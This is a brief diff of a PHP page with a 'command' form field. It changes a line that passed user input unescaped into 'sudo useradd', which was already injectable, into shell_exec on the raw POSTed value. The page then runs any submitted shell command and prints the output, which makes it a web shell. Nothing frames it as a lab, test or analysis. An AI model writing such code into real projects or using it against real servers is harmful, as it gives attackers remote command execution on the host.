@@ -9,7 +9,7 @@ command? <input type="text" name="command">
 
 $command = $_POST["command"];
 echo "<pre>";
-echo shell_exec("sudo useradd $command");
+echo shell_exec($command);
 echo "</pre";
 
 ?>
